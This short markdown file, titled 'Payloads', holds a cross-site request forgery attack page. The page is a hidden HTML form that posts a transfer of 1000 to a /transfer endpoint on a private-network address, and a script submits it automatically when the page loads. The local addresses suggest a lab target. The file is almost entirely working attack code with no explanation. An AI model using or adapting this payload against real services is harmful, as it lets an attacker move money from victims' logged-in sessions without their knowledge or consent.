# Payloads

## Payload 1: HTML Form Auto Submit

http://localhost:8080/transfer?amount=1000
http://192.168.109.131:8080/balance

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <form action="http://192.168.109.131:8080/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
    </form>
</body>

</html>

<script>
    document.forms[0].submit();
</script>
